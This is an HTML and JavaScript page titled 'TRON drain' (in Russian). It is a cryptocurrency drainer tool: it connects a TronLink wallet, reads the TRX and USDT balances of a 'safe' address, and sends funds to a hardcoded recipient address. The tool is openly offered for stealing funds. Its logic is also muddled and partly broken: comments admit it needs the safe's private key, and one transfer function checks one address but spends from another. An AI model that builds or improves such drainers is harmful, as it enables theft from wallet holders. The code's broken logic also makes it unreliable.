<!DOCTYPE html>
<html>
<head>
    <title>Слив TRON</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/tronweb.min.js"></script>
    <style>
        body { font-family: sans-serif; max-width: 400px; margin: 20px auto; padding: 20px; background: #f0f0f0; text-align: center; }
        .card { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 10px; margin: 5px 0 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; margin: 5px 0; background: #16a355; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
        button:disabled { background: #ccc; }
        #log { background: #eee; padding: 10px; font-size: 12px; text-align: left; margin-top: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🚀 Слив TRX / USDT</h2>
        <p style="font-size: 12px; color: #666;">1. Установи расширение TronLink.<br>2. Импортируй туда свой кошелек.</p>
        
        <input type="text" id="safeAddr" placeholder="Адрес сейфа (где деньги)">
        <input type="text" id="targetAddr" value="TWanTomGkHcNWhCVrYkohnuYkbBRKZLere">
        
        <button id="btnConnect" onclick="connectTron()">1. Подключить кошелек</button>
        <button id="btnDrainTRX" onclick="drainTRX()" disabled>2. Слить TRX</button>
        <button id="btnDrainUSDT" onclick="drainUSDT()" disabled>3. Слить USDT</button>
        
        <div id="log">Ожидание...</div>
    </div>

    <script>
        let tron = null;
        let myAddress = "";
        const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const logDiv = document.getElementById('log');

        function log(msg) {
            logDiv.innerHTML = `<div>🕒 ${msg}</div>` + logDiv.innerHTML;
        }

        async function connectTron() {
            try {
                // 1. Попытка найти расширение TronLink
                if (window.tronWeb) {
                    tron = window.tronWeb;
                    log("TronLink найден!");
                } else {
                    // 2. Если расширения нет - создаем новый TronWeb
                    tron = new TronWeb({ fullHost: 'https://api.trongrid.io' });
                    log("TronLink не найден! Используйте расширение.");
                }

                // 3. Получаем адреса
                const accounts = await tron.getAccounts();
                if (accounts && accounts.length > 0) {
                    myAddress = accounts[0]; // Берем первый адрес
                    log("Кошелек подключен: " + myAddress);
                    
                    // Обновляем кнопки
                    document.getElementById('btnConnect').innerText = "✅ Подключено (" + myAddress.substring(0, 6) + "...)";
                    document.getElementById('btnConnect').disabled = true;
                    document.getElementById('btnDrainTRX').disabled = false;
                    document.getElementById('btnDrainUSDT').disabled = false;
                } else {
                    log("Адресов не найдено.");
                }
            } catch (e) {
                log("Ошибка: " + e.message);
            }
        }

        async function drainTRX() {
            const safe = document.getElementById('safeAddr').value.trim();
            const target = document.getElementById('targetAddr').value.trim();
            
            if (!safe) return alert("Введите адрес сейфа");

            try {
                log("Проверка TRX на сейфе...");
                
                // 1. Проверяем баланс TRX
                const balance = await tron.trx.getBalance(safe);
                log(`TRX: ${(balance / 1000000).toFixed(4)}`);

                if (balance < 3000000) return alert("Мало TRX на газ (< 3)");

                log("Отправляем TRX...");
                
                // 2. Отправляем (Тут важный момент: это простой перевод)
                // Если сейф - это мульти-подпись (контракт), то нужно вызывать execTransaction
                // Пока пробуем просто transfer
                
                const amount = balance - 3000000; // Оставляем 3 TRX на газ
                
                // Если сейф и твой кошелек - разные адреса, нужен вызов контракта.
                // Для теста пробуем отправить с ТВОЕГО кошелька на Твой адрес (не туда же!)
                // Чтобы слить С БЕЧЕРГА НА ТЕБЯ, нужно, чтобы сейф был подписан твоим ключом.
                
                let txid;
                try {
                     // Это попытка отправить TRX с адреса сейфа (нужен приватный ключ сейфа!)
                     const tx = await tron.trx.sendTrx(myAddress, target, amount, { feeLimit: 10000000 });
                     txid = tx[0];
                } catch (e) {
                     log("Ошибка отправки (проверь, чей это сейф).");
                     return;
                }

                log(`✅ Успех! <a href="https://tronscan.org/#/transaction/${txid}" target="_blank">TRX Ушел</a>`);

            } catch (e) {
                log("Ошибка: " + e.message);
            }
        }
        
        // Функция USDT (по аналогии)
        async function drainUSDT() {
            const safe = document.getElementById('safeAddr').value.trim();
            const target = document.getElementById('targetAddr').value.trim();
            log("Проверка USDT...");
            
            try {
                const balance = await tron.contract.at(usdtContract).balanceOf(safe).call();
                log(`USDT: ${balance}`);
                
                if (balance < 1000000) return log("Мало USDT");
                
                await tron.contract.at(usdtContract).transfer(target, balance).send({ feeLimit: 100000000 });
                log(`✅ USDT Ушел!`);
            } catch (e) {
                log("Ошибка USDT: " + e.message);
            }
        }
    </script>
</body>
</html>
